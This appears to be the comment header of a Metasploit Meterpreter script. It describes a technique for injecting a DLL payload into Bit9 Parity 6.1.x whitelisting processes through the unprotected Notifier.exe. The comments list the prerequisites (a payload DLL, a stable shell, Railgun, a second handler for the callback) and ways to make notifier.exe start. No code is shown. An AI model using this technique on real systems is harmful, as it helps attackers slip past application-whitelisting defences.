# Meterpreter script that injects into Bit9 Parity Application Whitelisting processes
# This takes advantage of a vulnerability in Bit9 Parity 6.1.x where 
# the Notifier.exe process is not protected and trusted to execute from
# Provided by: Curt Shaffer <cshaffer [at] gmail.com>
#
# Prerequisites: You will need to have a DLL payload that you want to use.
# I use Meterpreter well, because it r0x :)
# You will need to have Bit9 Server running and you will need a policy created for your client
# Most likely you will want to have this in lock down mode.
# You will need a stable shell first as well. This script relies on Railgun at this point
# With that said, go over the the Metasploit bug tracker and vote for Jailgun (Java Rail Gun)
# You will then need to start another handler to recieve the connection from your DLL
# You could probably just do this with one multi hander, but I found it's easier to seperate
# for demo purposes.
# Any feedback is welcome

# You will need to create your DLL and put it in your path or reference the full path

# Had to do this in this way. Otherwise it seemed that it would not start notifier.exe properly
# Note that I'm using net.exe which I have set as banned in my Bit9 Policy
# You can use this or there are many ways to cause notifier.exe to start. 
# For example, you could just try to kill the parity.exe process and execute a pending file
